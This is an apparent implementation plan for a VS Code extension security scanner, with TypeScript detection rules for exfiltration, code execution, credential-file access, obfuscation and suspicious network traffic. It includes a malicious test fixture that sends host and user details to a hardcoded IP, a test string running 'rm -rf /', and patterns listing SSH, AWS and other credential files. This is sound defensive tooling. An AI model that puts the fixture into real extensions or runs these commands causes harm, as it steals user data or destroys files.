# Extension Guard Phase 2: Analyzers & Rules Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Implement the rule engine, behavior analyzer, and core detection rules.

**Architecture:** Rule Engine executes DetectionRule implementations against collected files. Behavior Analyzer uses regex patterns and AST analysis to detect malicious behaviors. Each rule is an independent module implementing the DetectionRule interface.

**Tech Stack:** TypeScript, regex patterns, @typescript-eslint/typescript-estree for AST analysis

---

## Task 1: Create Rule Engine Infrastructure

**Files:**
- Create: `packages/core/src/rules/rule.interface.ts`
- Create: `packages/core/src/rules/rule-engine.ts`
- Create: `packages/core/src/rules/rule-registry.ts`
- Create: `packages/core/test/rules/rule-engine.test.ts`

**Step 1: Create packages/core/src/rules/rule.interface.ts**

```typescript
import type { Severity, FindingCategory, ExtensionManifest } from '../types/index.js';

export interface Evidence {
  filePath: string;
  lineNumber?: number;
  columnNumber?: number;
  lineContent?: string;
  contextBefore?: string[];
  contextAfter?: string[];
  matchedPattern?: string;
  snippet?: string;
}

export interface DetectionRule {
  id: string;
  name: string;
  description: string;
  severity: Severity;
  category: FindingCategory;
  mitreAttackId?: string;
  enabled: boolean;

  detect(
    files: Map<string, string>,
    manifest: ExtensionManifest
  ): Evidence[];
}
```

**Step 2: Create packages/core/src/rules/rule-registry.ts**

```typescript
import type { DetectionRule } from './rule.interface.js';

class RuleRegistry {
  private rules: Map<string, DetectionRule> = new Map();

  register(rule: DetectionRule): void {
    this.rules.set(rule.id, rule);
  }

  get(id: string): DetectionRule | undefined {
    return this.rules.get(id);
  }

  getAll(): DetectionRule[] {
    return Array.from(this.rules.values());
  }

  getEnabled(): DetectionRule[] {
    return this.getAll().filter((rule) => rule.enabled);
  }

  getByCategory(category: string): DetectionRule[] {
    return this.getAll().filter((rule) => rule.category === category);
  }

  getBySeverity(severity: string): DetectionRule[] {
    return this.getAll().filter((rule) => rule.severity === severity);
  }
}

export const ruleRegistry = new RuleRegistry();
```

**Step 3: Create packages/core/src/rules/rule-engine.ts**

```typescript
import type { ExtensionManifest, Finding, Severity } from '../types/index.js';
import type { DetectionRule, Evidence } from './rule.interface.js';
import { ruleRegistry } from './rule-registry.js';
import { randomUUID } from 'node:crypto';

export interface RuleEngineOptions {
  rules?: string[];
  skipRules?: string[];
  minSeverity?: Severity;
}

const SEVERITY_ORDER: Record<Severity, number> = {
  critical: 0,
  high: 1,
  medium: 2,
  low: 3,
  info: 4,
};

export class RuleEngine {
  private options: RuleEngineOptions;

  constructor(options: RuleEngineOptions = {}) {
    this.options = options;
  }

  run(
    files: Map<string, string>,
    manifest: ExtensionManifest
  ): Finding[] {
    const findings: Finding[] = [];
    const rules = this.getApplicableRules();

    for (const rule of rules) {
      try {
        const evidences = rule.detect(files, manifest);
        for (const evidence of evidences) {
          findings.push(this.createFinding(rule, evidence));
        }
      } catch (error) {
        // Log error but continue with other rules
        console.error(`Rule ${rule.id} failed:`, error);
      }
    }

    return findings;
  }

  private getApplicableRules(): DetectionRule[] {
    let rules = ruleRegistry.getEnabled();

    // Filter by specific rules if provided
    if (this.options.rules && this.options.rules.length > 0) {
      rules = rules.filter((r) => this.options.rules!.includes(r.id));
    }

    // Exclude skipped rules
    if (this.options.skipRules && this.options.skipRules.length > 0) {
      rules = rules.filter((r) => !this.options.skipRules!.includes(r.id));
    }

    // Filter by minimum severity
    if (this.options.minSeverity) {
      const minOrder = SEVERITY_ORDER[this.options.minSeverity];
      rules = rules.filter((r) => SEVERITY_ORDER[r.severity] <= minOrder);
    }

    return rules;
  }

  private createFinding(rule: DetectionRule, evidence: Evidence): Finding {
    return {
      id: randomUUID(),
      ruleId: rule.id,
      severity: rule.severity,
      category: rule.category,
      title: rule.name,
      description: rule.description,
      evidence: {
        filePath: evidence.filePath,
        lineNumber: evidence.lineNumber,
        columnNumber: evidence.columnNumber,
        lineContent: evidence.lineContent,
        contextBefore: evidence.contextBefore,
        contextAfter: evidence.contextAfter,
        matchedPattern: evidence.matchedPattern,
        snippet: evidence.snippet,
      },
      mitreAttackId: rule.mitreAttackId,
    };
  }
}
```

**Step 4: Create packages/core/src/rules/index.ts**

```typescript
export * from './rule.interface.js';
export * from './rule-engine.js';
export * from './rule-registry.js';
```

**Step 5: Create test file packages/core/test/rules/rule-engine.test.ts**

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { RuleEngine } from '../../src/rules/rule-engine.js';
import { ruleRegistry } from '../../src/rules/rule-registry.js';
import type { DetectionRule } from '../../src/rules/rule.interface.js';
import type { ExtensionManifest } from '../../src/types/index.js';

describe('RuleEngine', () => {
  const mockManifest: ExtensionManifest = {
    name: 'test-ext',
    publisher: 'test',
    version: '1.0.0',
  };

  const mockRule: DetectionRule = {
    id: 'TEST-001',
    name: 'Test Rule',
    description: 'A test rule',
    severity: 'high',
    category: 'suspicious-network',
    enabled: true,
    detect: (files) => {
      const evidences = [];
      for (const [path, content] of files) {
        if (content.includes('malicious')) {
          evidences.push({
            filePath: path,
            lineNumber: 1,
            lineContent: content,
            matchedPattern: 'malicious',
          });
        }
      }
      return evidences;
    },
  };

  beforeEach(() => {
    // Clear and re-register for each test
    ruleRegistry.register(mockRule);
  });

  it('should create rule engine with default options', () => {
    const engine = new RuleEngine();
    expect(engine).toBeDefined();
  });

  it('should detect findings when rule matches', () => {
    const engine = new RuleEngine();
    const files = new Map([['test.js', 'const x = "malicious";']]);

    const findings = engine.run(files, mockManifest);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.ruleId).toBe('TEST-001');
    expect(findings[0]?.severity).toBe('high');
  });

  it('should return empty array when no rules match', () => {
    const engine = new RuleEngine();
    const files = new Map([['test.js', 'const x = "safe";']]);

    const findings = engine.run(files, mockManifest);

    expect(findings).toHaveLength(0);
  });

  it('should skip disabled rules', () => {
    const disabledRule: DetectionRule = {
      ...mockRule,
      id: 'TEST-002',
      enabled: false,
    };
    ruleRegistry.register(disabledRule);

    const engine = new RuleEngine();
    const files = new Map([['test.js', 'malicious']]);

    const findings = engine.run(files, mockManifest);
    const ruleIds = findings.map((f) => f.ruleId);

    expect(ruleIds).not.toContain('TEST-002');
  });
});
```

**Step 6: Run tests and commit**

```bash
cd /home/ubuntu/extension-guard/packages/core && pnpm test -- rule-engine
git add -A && git commit -m "feat(core): implement rule engine infrastructure"
```

---

## Task 2: Implement Data Exfiltration Rule (EG-CRIT-001)

**Files:**
- Create: `packages/core/src/rules/built-in/crit-data-exfiltration.ts`
- Create: `packages/core/src/rules/built-in/index.ts`
- Create: `packages/core/test/fixtures/extensions/malicious-exfil/package.json`
- Create: `packages/core/test/fixtures/extensions/malicious-exfil/src/extension.js`
- Create: `packages/core/test/rules/crit-data-exfiltration.test.ts`

**Step 1: Create malicious fixture**

Create `packages/core/test/fixtures/extensions/malicious-exfil/package.json`:
```json
{
  "name": "malicious-exfil",
  "displayName": "Malicious Exfil",
  "version": "1.0.0",
  "publisher": "evil-publisher",
  "engines": { "vscode": "^1.80.0" },
  "main": "./src/extension.js"
}
```

Create `packages/core/test/fixtures/extensions/malicious-exfil/src/extension.js`:
```javascript
const os = require('os');
const https = require('https');

function activate() {
  const hostname = os.hostname();
  const userInfo = os.userInfo();
  const platform = os.platform();

  const data = JSON.stringify({ hostname, user: userInfo.username, platform });

  https.request('https://45.33.32.156/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, (res) => {}).end(data);
}

module.exports = { activate };
```

**Step 2: Create packages/core/src/rules/built-in/crit-data-exfiltration.ts**

```typescript
import type { DetectionRule, Evidence } from '../rule.interface.js';
import type { ExtensionManifest } from '../../types/index.js';

const SYSTEM_INFO_PATTERNS = [
  /os\.hostname\s*\(\)/g,
  /os\.userInfo\s*\(\)/g,
  /os\.platform\s*\(\)/g,
  /os\.arch\s*\(\)/g,
  /os\.networkInterfaces\s*\(\)/g,
  /os\.cpus\s*\(\)/g,
  /os\.homedir\s*\(\)/g,
  /process\.env/g,
];

const HTTP_TO_IP_PATTERN = /(?:https?\.request|fetch|axios\.(?:get|post|put))\s*\(\s*['"`]https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;

const FILE_READ_AND_SEND_PATTERN = /(?:readFileSync|readFile)\s*\([^)]*\)[\s\S]{0,500}(?:\.post|fetch|request|axios)/g;

export const critDataExfiltration: DetectionRule = {
  id: 'EG-CRIT-001',
  name: 'Data Exfiltration Pattern',
  description: 'Detects code that collects system info and sends it to external servers',
  severity: 'critical',
  category: 'data-exfiltration',
  mitreAttackId: 'T1041',
  enabled: true,

  detect(
    files: Map<string, string>,
    _manifest: ExtensionManifest
  ): Evidence[] {
    const evidences: Evidence[] = [];

    for (const [filePath, content] of files) {
      if (!filePath.endsWith('.js') && !filePath.endsWith('.ts')) {
        continue;
      }

      const lines = content.split('\n');

      // Check for system info collection + HTTP to IP
      let hasSystemInfo = false;
      let hasHttpToIp = false;
      let systemInfoLine = 0;
      let httpToIpLine = 0;

      for (const pattern of SYSTEM_INFO_PATTERNS) {
        pattern.lastIndex = 0;
        const match = pattern.exec(content);
        if (match) {
          hasSystemInfo = true;
          systemInfoLine = content.slice(0, match.index).split('\n').length;
          break;
        }
      }

      HTTP_TO_IP_PATTERN.lastIndex = 0;
      const httpMatch = HTTP_TO_IP_PATTERN.exec(content);
      if (httpMatch) {
        hasHttpToIp = true;
        httpToIpLine = content.slice(0, httpMatch.index).split('\n').length;
      }

      if (hasSystemInfo && hasHttpToIp) {
        evidences.push({
          filePath,
          lineNumber: httpToIpLine,
          lineContent: lines[httpToIpLine - 1]?.trim(),
          matchedPattern: 'system-info-collection + http-to-ip',
          snippet: `System info collected at line ${systemInfoLine}, sent to IP at line ${httpToIpLine}`,
        });
      }

      // Check for file read + send pattern
      FILE_READ_AND_SEND_PATTERN.lastIndex = 0;
      let fileMatch;
      while ((fileMatch = FILE_READ_AND_SEND_PATTERN.exec(content)) !== null) {
        const lineNumber = content.slice(0, fileMatch.index).split('\n').length;
        evidences.push({
          filePath,
          lineNumber,
          lineContent: lines[lineNumber - 1]?.trim(),
          matchedPattern: 'file-read-and-send',
          snippet: fileMatch[0].slice(0, 200),
        });
      }
    }

    return evidences;
  },
};
```

**Step 3: Create packages/core/src/rules/built-in/index.ts**

```typescript
import { ruleRegistry } from '../rule-registry.js';
import { critDataExfiltration } from './crit-data-exfiltration.js';

// Register all built-in rules
export function registerBuiltInRules(): void {
  ruleRegistry.register(critDataExfiltration);
}

// Export individual rules for direct access
export { critDataExfiltration };
```

**Step 4: Create test file**

```typescript
// packages/core/test/rules/crit-data-exfiltration.test.ts
import { describe, it, expect } from 'vitest';
import { critDataExfiltration } from '../../src/rules/built-in/crit-data-exfiltration.js';
import type { ExtensionManifest } from '../../src/types/index.js';

describe('EG-CRIT-001: Data Exfiltration', () => {
  const mockManifest: ExtensionManifest = {
    name: 'test',
    publisher: 'test',
    version: '1.0.0',
  };

  it('should detect system info collection + HTTP to IP', () => {
    const files = new Map([
      ['src/extension.js', `
        const os = require('os');
        const hostname = os.hostname();
        https.request('https://45.33.32.156/collect', {});
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toContain('system-info');
  });

  it('should not flag normal code without exfiltration', () => {
    const files = new Map([
      ['src/extension.js', `
        const vscode = require('vscode');
        function activate(context) {
          console.log('Hello');
        }
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });

  it('should not flag HTTP to domain (only IP)', () => {
    const files = new Map([
      ['src/extension.js', `
        const os = require('os');
        os.hostname();
        fetch('https://api.github.com/repos');
      `],
    ]);

    const evidences = critDataExfiltration.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });
});
```

**Step 5: Run tests and commit**

```bash
mkdir -p packages/core/src/rules/built-in
mkdir -p packages/core/test/rules
mkdir -p packages/core/test/fixtures/extensions/malicious-exfil/src
pnpm test
git add -A && git commit -m "feat(core): implement EG-CRIT-001 data exfiltration rule"
```

---

## Task 3: Implement Remote Code Execution Rule (EG-CRIT-002)

**Files:**
- Create: `packages/core/src/rules/built-in/crit-remote-execution.ts`
- Create: `packages/core/test/rules/crit-remote-execution.test.ts`

**Step 1: Create packages/core/src/rules/built-in/crit-remote-execution.ts**

```typescript
import type { DetectionRule, Evidence } from '../rule.interface.js';
import type { ExtensionManifest } from '../../types/index.js';

const DANGEROUS_EXEC_PATTERNS = [
  { name: 'child_process-exec', pattern: /child_process['"]\s*\)?\s*\.?\s*exec\s*\(/g },
  { name: 'child_process-execSync', pattern: /child_process['"]\s*\)?\s*\.?\s*execSync\s*\(/g },
  { name: 'child_process-spawn-shell', pattern: /spawn\s*\([^)]*,\s*\{[^}]*shell\s*:\s*true/g },
  { name: 'eval', pattern: /\beval\s*\(/g },
  { name: 'Function-constructor', pattern: /new\s+Function\s*\(/g },
  { name: 'vm-runInContext', pattern: /vm\.run(?:InContext|InNewContext|InThisContext)\s*\(/g },
];

const DYNAMIC_REQUIRE_PATTERN = /require\s*\(\s*(?:[^'")`]|`[^`]*\$\{)/g;

export const critRemoteExecution: DetectionRule = {
  id: 'EG-CRIT-002',
  name: 'Remote Code Execution',
  description: 'Detects dangerous code execution patterns like eval, exec, or dynamic require',
  severity: 'critical',
  category: 'remote-code-execution',
  mitreAttackId: 'T1059',
  enabled: true,

  detect(
    files: Map<string, string>,
    _manifest: ExtensionManifest
  ): Evidence[] {
    const evidences: Evidence[] = [];

    for (const [filePath, content] of files) {
      if (!filePath.endsWith('.js') && !filePath.endsWith('.ts')) {
        continue;
      }

      const lines = content.split('\n');

      // Check dangerous exec patterns
      for (const { name, pattern } of DANGEROUS_EXEC_PATTERNS) {
        pattern.lastIndex = 0;
        let match;
        while ((match = pattern.exec(content)) !== null) {
          const lineNumber = content.slice(0, match.index).split('\n').length;
          evidences.push({
            filePath,
            lineNumber,
            lineContent: lines[lineNumber - 1]?.trim(),
            matchedPattern: name,
            snippet: match[0],
          });
        }
      }

      // Check dynamic require
      DYNAMIC_REQUIRE_PATTERN.lastIndex = 0;
      let match;
      while ((match = DYNAMIC_REQUIRE_PATTERN.exec(content)) !== null) {
        const lineNumber = content.slice(0, match.index).split('\n').length;
        evidences.push({
          filePath,
          lineNumber,
          lineContent: lines[lineNumber - 1]?.trim(),
          matchedPattern: 'dynamic-require',
          snippet: match[0],
        });
      }
    }

    return evidences;
  },
};
```

**Step 2: Create test**

```typescript
// packages/core/test/rules/crit-remote-execution.test.ts
import { describe, it, expect } from 'vitest';
import { critRemoteExecution } from '../../src/rules/built-in/crit-remote-execution.js';
import type { ExtensionManifest } from '../../src/types/index.js';

describe('EG-CRIT-002: Remote Code Execution', () => {
  const mockManifest: ExtensionManifest = {
    name: 'test',
    publisher: 'test',
    version: '1.0.0',
  };

  it('should detect eval()', () => {
    const files = new Map([
      ['src/extension.js', 'const result = eval(userInput);'],
    ]);

    const evidences = critRemoteExecution.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toBe('eval');
  });

  it('should detect child_process.exec', () => {
    const files = new Map([
      ['src/extension.js', `
        const { exec } = require('child_process');
        exec('rm -rf /');
      `],
    ]);

    const evidences = critRemoteExecution.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
  });

  it('should detect new Function()', () => {
    const files = new Map([
      ['src/extension.js', 'const fn = new Function("return " + code);'],
    ]);

    const evidences = critRemoteExecution.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toBe('Function-constructor');
  });

  it('should not flag safe code', () => {
    const files = new Map([
      ['src/extension.js', `
        const vscode = require('vscode');
        function evaluate(x) { return x * 2; }
      `],
    ]);

    const evidences = critRemoteExecution.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });
});
```

**Step 3: Update built-in/index.ts**

```typescript
import { ruleRegistry } from '../rule-registry.js';
import { critDataExfiltration } from './crit-data-exfiltration.js';
import { critRemoteExecution } from './crit-remote-execution.js';

export function registerBuiltInRules(): void {
  ruleRegistry.register(critDataExfiltration);
  ruleRegistry.register(critRemoteExecution);
}

export { critDataExfiltration, critRemoteExecution };
```

**Step 4: Run tests and commit**

```bash
pnpm test
git add -A && git commit -m "feat(core): implement EG-CRIT-002 remote code execution rule"
```

---

## Task 4: Implement Credential Access Rule (EG-CRIT-003)

**Files:**
- Create: `packages/core/src/rules/built-in/crit-credential-access.ts`
- Create: `packages/core/test/rules/crit-credential-access.test.ts`

**Step 1: Create packages/core/src/rules/built-in/crit-credential-access.ts**

```typescript
import type { DetectionRule, Evidence } from '../rule.interface.js';
import type { ExtensionManifest } from '../../types/index.js';

const SENSITIVE_PATHS = [
  { name: 'ssh-keys', pattern: /['"`].*\.ssh[/\\](?:id_rsa|id_ed25519|id_ecdsa|known_hosts|config|authorized_keys)['"`]/gi },
  { name: 'gnupg', pattern: /['"`].*\.gnupg[/\\]/gi },
  { name: 'aws-credentials', pattern: /['"`].*\.aws[/\\]credentials['"`]/gi },
  { name: 'azure-config', pattern: /['"`].*\.azure[/\\]/gi },
  { name: 'kube-config', pattern: /['"`].*\.kube[/\\]config['"`]/gi },
  { name: 'git-credentials', pattern: /['"`].*\.git-credentials['"`]/gi },
  { name: 'env-file', pattern: /['"`].*\.env(?:\.\w+)?['"`]/gi },
  { name: 'npmrc', pattern: /['"`].*\.npmrc['"`]/gi },
  { name: 'docker-config', pattern: /['"`].*\.docker[/\\]config\.json['"`]/gi },
  { name: 'netrc', pattern: /['"`].*\.netrc['"`]/gi },
  { name: 'pypirc', pattern: /['"`].*\.pypirc['"`]/gi },
];

const FILE_READ_FUNCTIONS = /(?:readFile|readFileSync|access|accessSync|exists|existsSync|stat|statSync|open|openSync)\s*\(/;

export const critCredentialAccess: DetectionRule = {
  id: 'EG-CRIT-003',
  name: 'Credential File Access',
  description: 'Detects attempts to read sensitive credential files',
  severity: 'critical',
  category: 'credential-theft',
  mitreAttackId: 'T1552.004',
  enabled: true,

  detect(
    files: Map<string, string>,
    _manifest: ExtensionManifest
  ): Evidence[] {
    const evidences: Evidence[] = [];

    for (const [filePath, content] of files) {
      if (!filePath.endsWith('.js') && !filePath.endsWith('.ts')) {
        continue;
      }

      const lines = content.split('\n');

      for (const { name, pattern } of SENSITIVE_PATHS) {
        pattern.lastIndex = 0;
        let match;
        while ((match = pattern.exec(content)) !== null) {
          // Check if this is near a file read function
          const startIndex = Math.max(0, match.index - 200);
          const endIndex = Math.min(content.length, match.index + match[0].length + 200);
          const context = content.slice(startIndex, endIndex);

          if (FILE_READ_FUNCTIONS.test(context)) {
            const lineNumber = content.slice(0, match.index).split('\n').length;
            evidences.push({
              filePath,
              lineNumber,
              lineContent: lines[lineNumber - 1]?.trim(),
              matchedPattern: name,
              snippet: match[0],
            });
          }
        }
      }
    }

    return evidences;
  },
};
```

**Step 2: Create test**

```typescript
// packages/core/test/rules/crit-credential-access.test.ts
import { describe, it, expect } from 'vitest';
import { critCredentialAccess } from '../../src/rules/built-in/crit-credential-access.js';
import type { ExtensionManifest } from '../../src/types/index.js';

describe('EG-CRIT-003: Credential Access', () => {
  const mockManifest: ExtensionManifest = {
    name: 'test',
    publisher: 'test',
    version: '1.0.0',
  };

  it('should detect SSH key access', () => {
    const files = new Map([
      ['src/extension.js', `
        const fs = require('fs');
        const key = fs.readFileSync('~/.ssh/id_rsa');
      `],
    ]);

    const evidences = critCredentialAccess.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toBe('ssh-keys');
  });

  it('should detect AWS credentials access', () => {
    const files = new Map([
      ['src/extension.js', `
        const creds = readFile('~/.aws/credentials');
      `],
    ]);

    const evidences = critCredentialAccess.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toBe('aws-credentials');
  });

  it('should detect .env file access', () => {
    const files = new Map([
      ['src/extension.js', `
        fs.readFileSync('.env.production');
      `],
    ]);

    const evidences = critCredentialAccess.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
  });

  it('should not flag normal file operations', () => {
    const files = new Map([
      ['src/extension.js', `
        const config = fs.readFileSync('./config.json');
      `],
    ]);

    const evidences = critCredentialAccess.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });
});
```

**Step 3: Update built-in/index.ts to include new rule**

**Step 4: Run tests and commit**

```bash
pnpm test
git add -A && git commit -m "feat(core): implement EG-CRIT-003 credential access rule"
```

---

## Task 5: Implement Obfuscation Detection Rule (EG-HIGH-001)

**Files:**
- Create: `packages/core/src/rules/built-in/high-obfuscated-code.ts`
- Create: `packages/core/test/rules/high-obfuscated-code.test.ts`

**Step 1: Create packages/core/src/rules/built-in/high-obfuscated-code.ts**

```typescript
import type { DetectionRule, Evidence } from '../rule.interface.js';
import type { ExtensionManifest } from '../../types/index.js';

// Detect large base64 strings (> 100 chars)
const BASE64_PATTERN = /['"`](?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?['"`]/g;
const MIN_BASE64_LENGTH = 100;

// Detect hex-encoded strings
const HEX_PATTERN = /\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){10,}/g;

// Detect suspicious string concatenation patterns
const CHAR_CODE_PATTERN = /String\.fromCharCode\s*\(\s*(?:\d+\s*,?\s*){5,}\)/g;

// Calculate entropy to detect obfuscation
function calculateEntropy(str: string): number {
  const len = str.length;
  if (len === 0) return 0;

  const freq: Record<string, number> = {};
  for (const char of str) {
    freq[char] = (freq[char] || 0) + 1;
  }

  let entropy = 0;
  for (const count of Object.values(freq)) {
    const p = count / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

export const highObfuscatedCode: DetectionRule = {
  id: 'EG-HIGH-001',
  name: 'Code Obfuscation Detected',
  description: 'Detects heavily obfuscated code patterns that may hide malicious behavior',
  severity: 'high',
  category: 'code-obfuscation',
  mitreAttackId: 'T1027',
  enabled: true,

  detect(
    files: Map<string, string>,
    _manifest: ExtensionManifest
  ): Evidence[] {
    const evidences: Evidence[] = [];

    for (const [filePath, content] of files) {
      if (!filePath.endsWith('.js') && !filePath.endsWith('.ts')) {
        continue;
      }

      const lines = content.split('\n');

      // Check for large base64 strings
      BASE64_PATTERN.lastIndex = 0;
      let match;
      while ((match = BASE64_PATTERN.exec(content)) !== null) {
        const base64Content = match[0].slice(1, -1); // Remove quotes
        if (base64Content.length >= MIN_BASE64_LENGTH) {
          const lineNumber = content.slice(0, match.index).split('\n').length;
          evidences.push({
            filePath,
            lineNumber,
            lineContent: lines[lineNumber - 1]?.trim().slice(0, 100) + '...',
            matchedPattern: 'large-base64',
            snippet: `Base64 string of ${base64Content.length} characters`,
          });
        }
      }

      // Check for hex-encoded strings
      HEX_PATTERN.lastIndex = 0;
      while ((match = HEX_PATTERN.exec(content)) !== null) {
        const lineNumber = content.slice(0, match.index).split('\n').length;
        evidences.push({
          filePath,
          lineNumber,
          lineContent: lines[lineNumber - 1]?.trim().slice(0, 100) + '...',
          matchedPattern: 'hex-encoded',
          snippet: match[0].slice(0, 50) + '...',
        });
      }

      // Check for String.fromCharCode abuse
      CHAR_CODE_PATTERN.lastIndex = 0;
      while ((match = CHAR_CODE_PATTERN.exec(content)) !== null) {
        const lineNumber = content.slice(0, match.index).split('\n').length;
        evidences.push({
          filePath,
          lineNumber,
          lineContent: lines[lineNumber - 1]?.trim(),
          matchedPattern: 'charcode-obfuscation',
          snippet: match[0].slice(0, 100),
        });
      }

      // Check overall file entropy (high entropy = likely obfuscated)
      const entropy = calculateEntropy(content);
      if (entropy > 5.5 && content.length > 1000) {
        evidences.push({
          filePath,
          lineNumber: 1,
          matchedPattern: 'high-entropy',
          snippet: `File entropy: ${entropy.toFixed(2)} (threshold: 5.5)`,
        });
      }
    }

    return evidences;
  },
};
```

**Step 2: Create test**

```typescript
// packages/core/test/rules/high-obfuscated-code.test.ts
import { describe, it, expect } from 'vitest';
import { highObfuscatedCode } from '../../src/rules/built-in/high-obfuscated-code.js';
import type { ExtensionManifest } from '../../src/types/index.js';

describe('EG-HIGH-001: Obfuscated Code', () => {
  const mockManifest: ExtensionManifest = {
    name: 'test',
    publisher: 'test',
    version: '1.0.0',
  };

  it('should detect large base64 strings', () => {
    const largeBase64 = 'A'.repeat(150);
    const files = new Map([
      ['src/extension.js', `const payload = "${largeBase64}";`],
    ]);

    const evidences = highObfuscatedCode.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toBe('large-base64');
  });

  it('should detect hex-encoded strings', () => {
    const files = new Map([
      ['src/extension.js', `const x = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21";`],
    ]);

    const evidences = highObfuscatedCode.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toBe('hex-encoded');
  });

  it('should detect String.fromCharCode abuse', () => {
    const files = new Map([
      ['src/extension.js', `const str = String.fromCharCode(72, 101, 108, 108, 111, 32);`],
    ]);

    const evidences = highObfuscatedCode.detect(files, mockManifest);

    expect(evidences.length).toBeGreaterThan(0);
    expect(evidences[0]?.matchedPattern).toBe('charcode-obfuscation');
  });

  it('should not flag normal code', () => {
    const files = new Map([
      ['src/extension.js', `
        const vscode = require('vscode');
        function activate() { console.log('Hello'); }
      `],
    ]);

    const evidences = highObfuscatedCode.detect(files, mockManifest);

    expect(evidences).toHaveLength(0);
  });
});
```

**Step 3: Update built-in/index.ts**

**Step 4: Run tests and commit**

```bash
pnpm test
git add -A && git commit -m "feat(core): implement EG-HIGH-001 obfuscation detection rule"
```

---

## Task 6: Implement Suspicious Network Rule (EG-HIGH-002)

**Files:**
- Create: `packages/core/src/rules/built-in/high-suspicious-network.ts`
- Create: `packages/core/test/rules/high-suspicious-network.test.ts`

**Step 1: Create the rule detecting HTTP to IP addresses**

```typescript
// packages/core/src/rules/built-in/high-suspicious-network.ts
import type { DetectionRule, Evidence } from '../rule.interface.js';
import type { ExtensionManifest } from '../../types/index.js';

// HTTP requests to IP addresses instead of domains
const HTTP_TO_IP = /(?:fetch|axios|https?\.(?:get|post|request)|XMLHttpRequest)\s*\([^)]*['"`]https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;

// Dynamic URL construction
const DYNAMIC_URL = /(?:fetch|axios|https?\.request)\s*\(\s*(?:`[^`]*\$\{|['"][^'"]*['"]\s*\+)/g;

// WebSocket to suspicious destinations
const WEBSOCKET_PATTERN = /new\s+WebSocket\s*\(\s*['"`]wss?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;

export const highSuspiciousNetwork: DetectionRule = {
  id: 'EG-HIGH-002',
  name: 'Suspicious Network Activity',
  description: 'Detects network requests to IP addresses or dynamically constructed URLs',
  severity: 'high',
  category: 'suspicious-network',
  mitreAttackId: 'T1071',
  enabled: true,

  detect(
    files: Map<string, string>,
    _manifest: ExtensionManifest
  ): Evidence[] {
    const evidences: Evidence[] = [];

    for (const [filePath, content] of files) {
      if (!filePath.endsWith('.js') && !filePath.endsWith('.ts')) {
        continue;
      }

      const lines = content.split('\n');
      const patterns = [
        { pattern: HTTP_TO_IP, name: 'http-to-ip' },
        { pattern: DYNAMIC_URL, name: 'dynamic-url' },
        { pattern: WEBSOCKET_PATTERN, name: 'websocket-to-ip' },
      ];

      for (const { pattern, name } of patterns) {
        pattern.lastIndex = 0;
        let match;
        while ((match = pattern.exec(content)) !== null) {
          const lineNumber = content.slice(0, match.index).split('\n').length;
          evidences.push({
            filePath,
            lineNumber,
            lineContent: lines[lineNumber - 1]?.trim(),
            matchedPattern: name,
            snippet: match[0].slice(0, 100),
          });
        }
      }
    }

    return evidences;
  },
};
```

**Step 2: Create test, update index, run tests, commit**

---

## Task 7: Integrate Rules into Scanner

**Files:**
- Modify: `packages/core/src/scanner/scanner.ts`
- Modify: `packages/core/src/index.ts`

**Step 1: Update scanner to use RuleEngine**

Update `packages/core/src/scanner/scanner.ts` to:
1. Import RuleEngine and registerBuiltInRules
2. Call registerBuiltInRules() in constructor
3. Create RuleEngine instance
4. Call ruleEngine.run() in scanExtension method
5. Use findings to calculate trust score and risk level

**Step 2: Update index.ts exports**

Add exports for rules module.

**Step 3: Implement trust score calculation**

Add a method to calculate trust score based on findings.

**Step 4: Run all tests and commit**

---

## Task 8: Add More Rules (EG-HIGH-003 to EG-MED-001)

Implement remaining high-priority rules:
- EG-HIGH-003: Dynamic URL construction
- EG-HIGH-004: Persistence (modifying settings.json)
- EG-HIGH-005: Programmatic extension installation
- EG-HIGH-006: Hardcoded secrets
- EG-MED-001: Excessive activation events (activationEvents: ["*"])

---

## Summary

After completing Phase 2, you will have:
- Rule Engine infrastructure
- 8+ detection rules covering critical and high severity threats
- Integration with scanner to produce real findings
- Trust score calculation based on findings
